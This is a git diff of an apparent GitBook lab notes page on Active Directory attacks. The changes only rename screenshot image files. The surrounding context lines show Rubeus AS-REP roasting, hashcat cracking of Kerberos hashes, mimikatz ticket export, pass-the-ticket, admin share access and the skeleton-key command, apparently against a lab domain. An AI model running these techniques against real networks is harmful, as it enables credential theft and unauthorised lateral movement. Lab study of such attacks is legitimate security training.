@@ -145,7 +145,7 @@ cd Downloads
 Rubeus.exe asreproast
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -162,7 +162,7 @@ Both passwords cracked.
 hashcat -m 18200 hash.txt Pass.txt --show
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Pass the Ticket w/ mimikatz
 
@@ -182,9 +182,9 @@ privilege::debug
 sekurlsa::tickets /export
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (7).png" alt=""><figcaption></figcaption></figure>
 
 ### Pass the Ticket w/ Mimikatz
 
@@ -196,7 +196,7 @@ Run this command inside of mimikatz with the ticket that you harvested from earl
 kerberos::ptt [0;2b4efc]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (10).png" alt=""><figcaption></figcaption></figure>
 
 Here were just verifying that we successfully impersonated the ticket by listing our cached ticket.
 
@@ -216,7 +216,7 @@ You now have impersonated the ticket giving you the same rights as the TGT you'r
 dir \\$VICTIM\admin$
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (11).png" alt=""><figcaption></figcaption></figure>
 
 ## Golden/Silver Ticket Attacks w/ mimikatz
 
@@ -300,7 +300,7 @@ privilege::debug
 misc::skeleton
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 
 
